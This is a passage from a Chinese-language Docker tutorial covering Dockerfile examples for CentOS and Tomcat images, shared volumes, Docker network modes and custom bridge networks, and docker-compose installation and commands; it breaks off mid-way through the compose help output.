<td>指定一个容器启动时要运行的命令。ENTRYPOINT的作用和CMD几乎一样，都是在指定容器启动程序及参数，但不会被docker run后的参数覆，可以通过docker run 的–entrypoint覆盖</td>
</tr>
<tr>
<td>ONBUILD</td>
<td>当构建一个被继承的Dockerfile时运行命令，父镜像在被子继承后父镜像的onbuild被触发，例如：<br>指定了ONBUILD RUN echo “—–父镜像回调触发器—–”，则子镜像在构建时，会触发ONBUILD触发器</td>
</tr>
<tr>
<td>USER</td>
<td>指定给哪个用户和用户组，语法：USER <user>[:<group>]</td>
</tr>
<tr>
<td>.dockerignore</td>
<td>类似.gitignore</td>
</tr>
</tbody></table>
</li>
<li><p>示例一：简单案例</p>
<ol>
<li><p>创建Dockerfile文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># volume test</span><br><span class="line">FROM centos</span><br><span class="line">VOLUME [&quot;/volume1&quot;,&quot;/volume2&quot;]</span><br><span class="line">CMD echo &quot;docker build succeed!&quot;</span><br><span class="line">CMD /bin/bash</span><br></pre></td></tr></table></figure>
</li>
<li><p>构建镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker build -f Dockerfile -t zhifei/centos:1.0.0 .</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建并运行容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">可通过-v指定容器卷volume1、volume2对应宿主机的目录，如不指定，会有默认宿主目录与之对应，通过docker inspect &lt;容器<span class="built_in">id</span>或容器名称&gt;查看</span></span><br><span class="line">docker run -it zhifei/centos:1.0.0</span><br></pre></td></tr></table></figure>

<p>若Docker挂载主机目录，Docker访问出现：cannot open directory . Permission denied。解决办法：在挂载目录后多加一个–privileged&#x3D;true参数。</p>
</li>
</ol>
</li>
<li><p>示例二：自定义tomcat镜像</p>
<ol>
<li><p>创建Dockerfile文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">MAINTAINER hezhifei&lt;he-zhifei@foxmail.com&gt;</span><br><span class="line">ENV JAVA_HOME /usr/local/jdk1.8.0_201</span><br><span class="line">ENV CATALINA_HOME /usr/local/apache-tomcat-8.5.65</span><br><span class="line">ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/bin</span><br><span class="line">ENV WORKSPACE /usr/local</span><br><span class="line">WORKDIR $WORKSPACE</span><br><span class="line">ADD apache-tomcat-8.5.65.tar.gz /usr/local</span><br><span class="line">ADD jdk-8u201-linux-x64.tar.gz /usr/local</span><br><span class="line">EXPOSE 8080</span><br><span class="line">CMD /usr/local/apache-tomcat-8.5.65/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-8.5.65/logs/catalina.out</span><br></pre></td></tr></table></figure>
</li>
<li><p>构建镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker build -f Dockerfile -t zhifei/tomcat:8.5.65 .</span><br></pre></td></tr></table></figure>
</li>
<li><p>创建并运行容器</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker run -it -d -p 7777:8080 -v /opt/docker/tomcat8.5.65/webapps:/usr/local/apache-tomcat-8.5.65/webapps -v /opt/docker/tomcat8.5.65/logs:/usr/local/apache-tomcat-8.5.65/logs --name=tomcat8.5.65 zhifei/tomcat:8.5.65</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>–volumes-from参数</p>
<p>  结论：容器之间配置信息的传递，数据卷的生命周期一直持续到没有容器使用它为止。</p>
<p>  也就是说，假设容器centos2和centos3均–volumes-from&#x3D;centos1，容器centos2的数据卷数据发生改变，容器centos1的数据卷也会发生对应的变化，同理，容器centos3的数据卷数据发生改变，容器centos1的数据卷也会发生对应的变化，相反地，容器centos1数据卷数据发生改变，同样会影响容器centos2,centos3数据卷的数据，实现了数据同步共享。当容器centos1被删除时，这种特性依然存在，因为数据卷的生命周期一直持续到没有容器使用它为止。</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">容器centos1、centos2、centos3的关系</span></span><br><span class="line">docker run -it --name=centos1 zhifei/centos:1.0.0</span><br><span class="line">docker run -it --name=centos2 --volumes-from=centos1 zhifei/centos:1.0.0</span><br><span class="line">docker run -it --name=centos3 --volumes-from=centos1 zhifei/centos:1.0.0</span><br></pre></td></tr></table></figure></li>
</ul>
<h1 id="5-docker网络"><a href="#5-docker网络" class="headerlink" title="5. docker网络"></a>5. docker网络</h1><h2 id="5-1-docker四种网络模式"><a href="#5-1-docker四种网络模式" class="headerlink" title="5.1 docker四种网络模式"></a>5.1 docker四种网络模式</h2><p>原理：Docker使用Linux桥接，在宿主机虚拟一个Docker容器网桥(docker0)，Docker启动一个容器时会根据Docker网桥的网段分配给容器一个IP地址，称为Container-IP，同时Docker网桥是每个容器的默认网关。因为在同一宿主机内的容器都接入同一个网桥，这样容器之间就能够通过容器的Container-IP直接通信。Docker网桥是宿主机虚拟出来的，并不是真实存在的网络设备，外部网络是无法寻址到的，这也意味着外部网络无法通过直接Container-IP访问到容器。如果容器希望外部访问能够访问到，可以通过映射容器端口到宿主主机（端口映射），即docker run创建容器时候通过 -p 或 -P 参数来启用，访问容器的时候就通过[宿主机IP]:[容器端口]访问容器。</p>
<table>
<thead>
<tr>
<th>Docker网络模式</th>
<th>配置</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>host模式</td>
<td>-–net&#x3D;host</td>
<td>容器和宿主机共享Network namespace。</td>
</tr>
<tr>
<td>container模式</td>
<td>-–net&#x3D;container:NAME_or_ID</td>
<td>容器和另外一个容器共享Network namespace。 kubernetes中的pod就是多个容器共享一个Network namespace。</td>
</tr>
<tr>
<td>none模式</td>
<td>-–net&#x3D;none</td>
<td>容器有独立的Network namespace，但并没有对其进行任何网络设置，如分配veth pair 和网桥连接，配置IP等。</td>
</tr>
<tr>
<td>bridge模式</td>
<td>-–net&#x3D;bridge</td>
<td>docker默认</td>
</tr>
</tbody></table>
<h3 id="5-1-1-host模式"><a href="#5-1-1-host模式" class="headerlink" title="5.1.1 host模式"></a>5.1.1 host模式</h3><p>如果启动容器的时候使用host模式，那么这个容器将不会获得一个独立的Network Namespace，而是和宿主机共用一个Network Namespace。容器将不会虚拟出自己的网卡，配置自己的IP等，而是使用宿主机的IP和端口。但是，容器的其他方面，如文件系统、进程列表等还是和宿主机隔离的。使用host模式的容器可以直接使用宿主机的IP地址与外界通信，容器内部的服务端口也可以使用宿主机的端口，不需要进行NAT，host最大的优势就是网络性能比较好，但是docker host上已经使用的端口就不能再用了，网络的隔离性不好。</p>
<h3 id="5-1-2-container模式"><a href="#5-1-2-container模式" class="headerlink" title="5.1.2 container模式"></a>5.1.2 container模式</h3><p>这个模式指定新创建的容器和已经存在的一个容器共享一个 Network Namespace，而不是和宿主机共享。新创建的容器不会创建自己的网卡，配置自己的 IP，而是和一个指定的容器共享 IP、端口范围等。同样，两个容器除了网络方面，其他的如文件系统、进程列表等还是隔离的。两个容器的进程可以通过 lo 网卡设备通信。</p>
<h3 id="5-1-3-none模式"><a href="#5-1-3-none模式" class="headerlink" title="5.1.3 none模式"></a>5.1.3 none模式</h3><p>使用none模式，Docker容器拥有自己的Network Namespace，但是，并不为Docker容器进行任何网络配置。也就是说，这个Docker容器没有网卡、IP、路由等信息。需要我们自己为Docker容器添加网卡、配置IP等。</p>
<p>这种网络模式下容器只有lo回环网络，没有其他网卡。none模式可以在容器创建时通过–network&#x3D;none来指定。这种类型的网络没有办法联网，封闭的网络能很好的保证容器的安全性。</p>
<h3 id="5-1-4-bridge模式"><a href="#5-1-4-bridge模式" class="headerlink" title="5.1.4 bridge模式"></a>5.1.4 bridge模式</h3><p>当Docker进程启动时，会在主机上创建一个名为docker0的虚拟网桥，此主机上启动的Docker容器会连接到这个虚拟网桥上。虚拟网桥的工作方式和物理交换机类似，这样主机上的所有容器就通过交换机连在了一个二层网络中。从docker0子网中分配一个IP给容器使用，并设置docker0的IP地址为容器的默认网关。在主机上创建一对虚拟网卡veth pair设备，Docker将veth pair设备的一端放在新创建的容器中，并命名为eth0（容器的网卡），另一端放在主机中，以vethxxx这样类似的名字命名，并将这个网络设备加入到docker0网桥中。可以通过brctl show命令查看。bridge模式是docker的默认网络模式，不写–net参数，就是bridge模式。使用docker run -p时，docker实际是在iptables做了DNAT规则，实现端口转发功能。可以使用iptables -t nat -vnL查看。</p>
<h2 id="5-2-docker网络隔离"><a href="#5-2-docker网络隔离" class="headerlink" title="5.2 docker网络隔离"></a>5.2 docker网络隔离</h2><p>引出：默认网络情况下，docker各个容器是可以通过ip相互之间ping通的。docker虚拟网络用的是evth-pair技术，docker容器带来的网卡都是一对一对的，evth-pair 就是一对的虚拟设备接口，都是成对出现的，一端连着协议，一端彼此连接，evth-pair 就像一个桥梁，连接各种虚拟网络设备，可通过ip add查看。但是，要是希望能通过容器名称ping通，如何处理呢？</p>
<h3 id="5-2-1-–link"><a href="#5-2-1-–link" class="headerlink" title="5.2.1 –link"></a>5.2.1 –link</h3><p>首先可以通过–link &lt;需要ping通的容器名&gt;，这种做法，底层是在当前容器的hosts文件中加多了一个映射，因此，只能在当前容器中ping通被link的容器（当向ping通），局限性太大。</p>
<h3 id="5-2-2-自定义网络"><a href="#5-2-2-自定义网络" class="headerlink" title="5.2.2 自定义网络"></a>5.2.2 自定义网络</h3><ol>
<li>自定义网络，指定对应的网关、子网</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看docker network用法</span></span><br><span class="line">[root@zhifei ~]# docker network --help</span><br><span class="line">Usage:  docker network COMMAND</span><br><span class="line">Manage networks</span><br><span class="line">Commands:</span><br><span class="line">  connect     Connect a container to a network</span><br><span class="line">  create      Create a network</span><br><span class="line">  disconnect  Disconnect a container from a network</span><br><span class="line">  inspect     Display detailed information on one or more networks</span><br><span class="line">  ls          List networks</span><br><span class="line">  prune       Remove all unused networks</span><br><span class="line">  rm          Remove one or more networks</span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看docker network create用法</span></span><br><span class="line">[root@zhifei ~]# docker network create --help</span><br><span class="line">Usage:  docker network create [OPTIONS] NETWORK</span><br><span class="line">Create a network</span><br><span class="line">Options:</span><br><span class="line">      --attachable           Enable manual container attachment</span><br><span class="line">      --aux-address map      Auxiliary IPv4 or IPv6 addresses used by Network driver (default map[])</span><br><span class="line">      --config-from string   The network from which to copy the configuration</span><br><span class="line">      --config-only          Create a configuration only network</span><br><span class="line">  -d, --driver string        Driver to manage the Network (default &quot;bridge&quot;)</span><br><span class="line">      --gateway strings      IPv4 or IPv6 Gateway for the master subnet</span><br><span class="line">      --ingress              Create swarm routing-mesh network</span><br><span class="line">      --internal             Restrict external access to the network</span><br><span class="line">      --ip-range strings     Allocate container ip from a sub-range</span><br><span class="line">      --ipam-driver string   IP Address Management Driver (default &quot;default&quot;)</span><br><span class="line">      --ipam-opt map         Set IPAM driver specific options (default map[])</span><br><span class="line">      --ipv6                 Enable IPv6 networking</span><br><span class="line">      --label list           Set metadata on a network</span><br><span class="line">  -o, --opt map              Set driver specific options (default map[])</span><br><span class="line">      --scope string         Control the network&#x27;s scope</span><br><span class="line">      --subnet strings       Subnet in CIDR format that represents a network segment</span><br><span class="line">      </span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建网关为172.19.0.1，子网为172.19.0.0/16的网络</span></span><br><span class="line">docker network create --driver bridge --gateway 172.19.0.1 --subnet 172.19.0.0/16 mynet:172:19</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看网络</span></span><br><span class="line">[root@zhifei ~]# docker network ls</span><br><span class="line">NETWORK ID     NAME           DRIVER    SCOPE</span><br><span class="line">1327777aa23d   bridge         bridge    local</span><br><span class="line">dbfde83d1370   host           host      local</span><br><span class="line">3a283d334d07   mynet:172:19   bridge    local</span><br><span class="line">fcc4e2fc153a   none           null      local</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>创建容器时，通过–net指定为自定义的网络</li>
</ol>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建mynet-tomcat01、mynet-tomcat02，指定为同一个网络mynet:172:19</span></span><br><span class="line">docker run -d -P --name mynet-tomcat01 --net mynet:172:19 tomcat</span><br><span class="line">docker run -d -P --name mynet-tomcat02 --net mynet:172:19 tomcat</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看是否能通过容器名称相互ping通</span></span><br><span class="line">docker exec -it mynet-tomcat01 ping mynet-tomcat02</span><br><span class="line">docker exec -it mynet-tomcat02 ping mynet-tomcat01</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结果如下：</span></span><br><span class="line">[root@zhifei ~]# docker exec -it mynet-tomcat01 ping mynet-tomcat02</span><br><span class="line">PING mynet-tomcat02 (172.19.0.3) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.19.0.3 (172.19.0.3): icmp_seq=1 ttl=64 time=0.062 ms</span><br><span class="line">64 bytes from 172.19.0.3 (172.19.0.3): icmp_seq=2 ttl=64 time=0.078 ms</span><br><span class="line">64 bytes from 172.19.0.3 (172.19.0.3): icmp_seq=3 ttl=64 time=0.077 ms</span><br><span class="line">64 bytes from 172.19.0.3 (172.19.0.3): icmp_seq=4 ttl=64 time=0.060 ms</span><br><span class="line">^C</span><br><span class="line">--- mynet-tomcat02 ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 1002ms</span><br><span class="line">rtt min/avg/max/mdev = 0.060/0.069/0.078/0.010 ms</span><br><span class="line">[root@zhifei ~]# docker exec -it mynet-tomcat02 ping mynet-tomcat01</span><br><span class="line">PING mynet-tomcat01 (172.19.0.2) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.19.0.2 (172.19.0.2): icmp_seq=1 ttl=64 time=0.041 ms</span><br><span class="line">64 bytes from 172.19.0.2 (172.19.0.2): icmp_seq=2 ttl=64 time=0.065 ms</span><br><span class="line">64 bytes from 172.19.0.2 (172.19.0.2): icmp_seq=3 ttl=64 time=0.058 ms</span><br><span class="line">64 bytes from 172.19.0.2 (172.19.0.2): icmp_seq=4 ttl=64 time=0.065 ms</span><br><span class="line">^C</span><br><span class="line">--- mynet-tomcat01 ping statistics ---</span><br><span class="line">4 packets transmitted, 4 received, 0% packet loss, time 4ms</span><br><span class="line">rtt min/avg/max/mdev = 0.041/0.057/0.065/0.011 ms</span><br><span class="line">结论：可以通过容器名称互ping</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建tomcat03、tomcat04，均不指定网络，使用默认的bridge</span></span><br><span class="line">docker run -d -P --name tomcat03 tomcat</span><br><span class="line">docker run -d -P --name tomcat04 tomcat</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看tomcat03是否能通过ip或容器名称ping通mynet-tomcat01</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结果如下：</span></span><br><span class="line">[root@zhifei ~]# docker exec -it tomcat03 ping mynet-tomcat01</span><br><span class="line">ping: mynet-tomcat01: Name or service not known</span><br><span class="line">[root@zhifei ~]# docker exec -it mynet-tomcat01 ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">7: eth0@if8: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">[root@zhifei ~]# docker exec -it tomcat03 ping 172.19.0.2</span><br><span class="line">PING 172.19.0.2 (172.19.0.2) 56(84) bytes of data.</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结论：无论通过ip或者容器名称，不同网络之间的容器均不能互连。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">但有需求tomcat03必须能访问mynet-tomcat01或mynet-tomcat02，如何处理？</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将tomcat03连接到mynet:172:19网络</span></span><br><span class="line">docker network connect mynet:172:19 tomcat03</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">再次通过ip或容器名称互ping，结果如下：</span></span><br><span class="line">[root@zhifei ~]# docker exec -it tomcat03 ping 172.19.0.2</span><br><span class="line">PING 172.19.0.2 (172.19.0.2) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.114 ms</span><br><span class="line">64 bytes from 172.19.0.2: icmp_seq=2 ttl=64 time=0.077 ms</span><br><span class="line">64 bytes from 172.19.0.2: icmp_seq=3 ttl=64 time=0.077 ms</span><br><span class="line">^C</span><br><span class="line">--- 172.19.0.2 ping statistics ---</span><br><span class="line">3 packets transmitted, 3 received, 0% packet loss, time 1001ms</span><br><span class="line">rtt min/avg/max/mdev = 0.077/0.089/0.114/0.019 ms</span><br><span class="line">[root@zhifei ~]# docker exec -it tomcat03 ping mynet-tomcat01</span><br><span class="line">PING mynet-tomcat01 (172.19.0.2) 56(84) bytes of data.</span><br><span class="line">64 bytes from 172.19.0.2 (172.19.0.2): icmp_seq=1 ttl=64 time=0.077 ms</span><br><span class="line">64 bytes from 172.19.0.2 (172.19.0.2): icmp_seq=2 ttl=64 time=0.078 ms</span><br><span class="line">^C</span><br><span class="line">--- mynet-tomcat01 ping statistics ---</span><br><span class="line">2 packets transmitted, 2 received, 0% packet loss, time 5ms</span><br><span class="line">rtt min/avg/max/mdev = 0.077/0.077/0.078/0.008 ms</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结果显示tomcat03与mynet-tomcat01或mynet-tomcat02的网络已经打通，查看网络mynet:172:19的情况</span></span><br><span class="line">[root@zhifei ~]# docker network inspect mynet:172:19</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Name&quot;: &quot;mynet:172:19&quot;,</span><br><span class="line">        &quot;Id&quot;: &quot;3a283d334d076ce2cb6e33837df93f81513803d30ab0c1427cb16f5ba143dae9&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2021-05-09T01:38:34.333637572+08:00&quot;,</span><br><span class="line">        &quot;Scope&quot;: &quot;local&quot;,</span><br><span class="line">        &quot;Driver&quot;: &quot;bridge&quot;,</span><br><span class="line">        &quot;EnableIPv6&quot;: false,</span><br><span class="line">        &quot;IPAM&quot;: &#123;</span><br><span class="line">            &quot;Driver&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">            &quot;Config&quot;: [</span><br><span class="line">                &#123;</span><br><span class="line">                    &quot;Subnet&quot;: &quot;172.19.0.0/16&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;172.19.0.1&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Internal&quot;: false,</span><br><span class="line">        &quot;Attachable&quot;: false,</span><br><span class="line">        &quot;Ingress&quot;: false,</span><br><span class="line">        &quot;ConfigFrom&quot;: &#123;</span><br><span class="line">            &quot;Network&quot;: &quot;&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;ConfigOnly&quot;: false,</span><br><span class="line">        &quot;Containers&quot;: &#123;</span><br><span class="line">            &quot;13bfb5b5df886a6f7da3c45a95e30d294e1ff6b500b27aabb837826779e0dad3&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;mynet-tomcat02&quot;,</span><br><span class="line">                &quot;EndpointID&quot;: &quot;b980f291998ac7fb20a8e4876128a7d0818933e8f428b1f943d562c0ca92a419&quot;,</span><br><span class="line">                &quot;MacAddress&quot;: &quot;02:42:ac:13:00:03&quot;,</span><br><span class="line">                &quot;IPv4Address&quot;: &quot;172.19.0.3/16&quot;,</span><br><span class="line">                &quot;IPv6Address&quot;: &quot;&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;2ea9de857b594f58174b47cc34e574d710fd0827df208e0c60d18edbea6e7115&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;tomcat03&quot;,</span><br><span class="line">                &quot;EndpointID&quot;: &quot;ec1f6d8729604333f7f8ad7cd800a4bef1e08d7a25475db16101757370ef662a&quot;,</span><br><span class="line">                &quot;MacAddress&quot;: &quot;02:42:ac:13:00:04&quot;,</span><br><span class="line">                &quot;IPv4Address&quot;: &quot;172.19.0.4/16&quot;,</span><br><span class="line">                &quot;IPv6Address&quot;: &quot;&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;7aef418b208c05c76ddea422ba3add20d7e6bd3c9063ebab25dcd7eda81bd5ae&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;mynet-tomcat01&quot;,</span><br><span class="line">                &quot;EndpointID&quot;: &quot;5d57985068f2076b676f5620bbd536c6ae7fb2daedbe4a317d8b21e9b6c368a7&quot;,</span><br><span class="line">                &quot;MacAddress&quot;: &quot;02:42:ac:13:00:02&quot;,</span><br><span class="line">                &quot;IPv4Address&quot;: &quot;172.19.0.2/16&quot;,</span><br><span class="line">                &quot;IPv6Address&quot;: &quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Options&quot;: &#123;&#125;,</span><br><span class="line">        &quot;Labels&quot;: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">结果表明：已经将tomcat03，加入到网络mynet:172:19中</span></span><br></pre></td></tr></table></figure>

<h1 id="6-docker-compose"><a href="#6-docker-compose" class="headerlink" title="6. docker compose"></a>6. docker compose</h1><h2 id="6-1-安装、升级、卸载"><a href="#6-1-安装、升级、卸载" class="headerlink" title="6.1 安装、升级、卸载"></a>6.1 安装、升级、卸载</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载，如果太慢，可以到github手动下载1.29.1版本的docker-compose-Linux-x86_64，再上传到/usr/local/bin，并重命名为docker-compose</span></span><br><span class="line">sudo curl -L &quot;https://github.com/docker/compose/releases/download/1.29.1/docker-compose-$(uname -s)-$(uname -m)&quot; -o /usr/local/bin/docker-compose</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">添加执行权限、创建链接、查看版本</span></span><br><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br><span class="line">sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose</span><br><span class="line">docker-compose --version</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">升级：如果要从Compose 1.2或更早版本进行升级，请在升级Compose之后删除或迁移现有容器。这是因为从1.3版开始，Compose使用Docker标签来跟踪容器，并且需要重新创建容器以添加标签。如果Compose检测到创建的没有标签的容器，它将拒绝运行，这样您就不会最终获得两组标签。如果要继续使用现有容器（例如，因为它们具有要保留的数据量），则可以使用Compose 1.5.x通过以下命令迁移它们：</span></span><br><span class="line">docker-compose migrate-to-labels</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载</span></span><br><span class="line">sudo rm /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<h2 id="6-2-docker-compose-yml"><a href="#6-2-docker-compose-yml" class="headerlink" title="6.2 docker-compose.yml"></a>6.2 docker-compose.yml</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">大致分为三层：</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">1.docker compose版本层，https://docs.docker.com/compose/compose-file/compose-file-v3/可查看docker不同版本对应的docker compose版本</span></span><br><span class="line">version:</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">2. 服务层</span></span><br><span class="line">services:	</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">3. 其它配置，例如网络、卷、全局配置</span></span><br><span class="line">volumes:</span><br><span class="line">networks:</span><br><span class="line">configs:</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">version: &quot;3.9&quot;</span><br><span class="line">services:</span><br><span class="line">  web:</span><br><span class="line">    build: .</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;5000:5000&quot;</span><br><span class="line">  redis:</span><br><span class="line">    image: &quot;redis:alpine&quot;</span><br></pre></td></tr></table></figure>

<h2 id="6-3-相关命令"><a href="#6-3-相关命令" class="headerlink" title="6.3 相关命令"></a>6.3 相关命令</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">把jar包、Dockerfile、docker-compose.yml放到同一目录下。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">up启动，down停止；--build启动前docker build；-d后台启动；--scale指定节点数。</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">例如这里启动2个节点：docker-compose up --build -d --scale demo=2</span></span><br><span class="line">docker-compose up [--build] [-d] [--scale &lt;服务名称&gt;=&lt;服务节点数&gt;]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">start-开启；stop-停止；restart-重启；up-创建和开启；down-停止和移除</span></span><br><span class="line">docker-compose start/stop/restart/up/down</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看日志</span></span><br><span class="line">[root@he ~]# docker-compose logs --help</span><br><span class="line">View output from containers.</span><br><span class="line"></span><br><span class="line">Usage: logs [options] [--] [SERVICE...]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">    --no-color              Produce monochrome output.</span><br><span class="line">    -f, --follow            Follow log output.</span><br><span class="line">    -t, --timestamps        Show timestamps.</span><br><span class="line">    --tail=&quot;all&quot;            Number of lines to show from the end of the logs</span><br><span class="line">                            for each container.</span><br><span class="line">    --no-log-prefix         Don&#x27;t print prefix in logs.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看帮助命令</span></span><br><span class="line">[root@he ~]# docker-compose --help</span><br><span class="line">Define and run multi-container applications with Docker.</span><br><span class="line">Usage:</span><br><span class="line">  docker-compose [-f &lt;arg&gt;...] [--profile &lt;name&gt;...] [options] [--] [COMMAND] [ARGS...]</span><br><span class="line">  docker-compose -h|--help</span><br><span class="line">Options:</span><br><span class="line">  -f, --file FILE             Specify an alternate compose file</span><br><span class="line">                              (default: docker-compose.yml)</span><br><span class="line">  -p, --project-name NAME     Specify an alternate project name</span><br><span class="line">                              (default: directory name)</span><br><span class="line">  --profile NAME              Specify a profile to enable</span><br><span class="line">  -c, --context NAME          Specify a context name</span><br><span class="line">  --verbose                   Show more output</span><br><span class="line">  --log-level LEVEL           Set log level (DEBUG, INFO, WARNING, ERROR, CRITICAL)</span><br><span class="line">  --ansi (never|always|auto)  Control when to print ANSI control characters</span><br><span class="line">  --no-ansi                   Do not print ANSI control characters (DEPRECATED)</span><br><span class="line">  -v, --version               Print version and exit</span><br><span class="line">  -H, --host HOST             Daemon socket to connect to</span><br><span class="line"></span><br><span class="line">  --tls                       Use TLS; implied by --tlsverify</span><br><span class="line">  --tlscacert CA_PATH         Trust certs signed only by this CA</span><br><span class="line">  --tlscert CLIENT_CERT_PATH  Path to TLS certificate file</span><br><span class="line">  --tlskey TLS_KEY_PATH       Path to TLS key file</span><br><span class="line">  --tlsverify                 Use TLS and verify the remote</span><br><span class="line">  --skip-hostname-check       Don&#x27;t check the daemon&#x27;s hostname against the</span><br><span class="line">                              name specified in the client certificate</span><br><span class="line">  --project-directory PATH    Specify an alternate working directory</span><br><span class="line">                              (default: the path of the Compose file)</span><br><span class="line">  --compatibility             If set, Compose will attempt to convert keys</span><br><span class="line">                              in v3 files to their non-Swarm equivalent (DEPRECATED)</span><br><span class="line">  --env-file PATH             Specify an alternate environment file</span><br><span class="line"></span><br><span class="line">Commands:</span><br><span class="line">  build              Build or rebuild services</span><br><span class="line">  config             Validate and view the Compose file</span><br><span class="line">  create             Create services</span><br><span class="line">  down               Stop and remove resources</span><br><span class="line">  events             Receive real time events from containers</span><br><span class="line">  exec               Execute a command in a running container</span><br><span class="line">  help               Get help on a command</span><br><span class="line">  images             List images</span><br><span class="line">  kill               Kill containers</span><br><span class="line">  logs               View output from containers</span><br><span class="line">  pause              Pause services</span><br><span class="line">  port               Print the public port for a port binding</span><br><span class="line">  ps                 List containers</span><br><span class="line">  pull               Pull service images</span><br><span class="line">  push               Push service images</span><br><span class="line">  restart            Restart services</span><br><span class="line">  rm                 Remove stopped containers</span><br><span class="line">  run                Run a one-off command</span><br><span class="line">  scale              Set number of containers for a service</span><br><span class="line">  start              Start services</span><br><span class="line">  stop               Stop services</span><br><span class="line">  top                Display the running processes</span><br><span class="line">  unpause            Unpause services</span><br><span class="line">  up                 Create and start containers</span><br><span class="line">  version            Show version information and 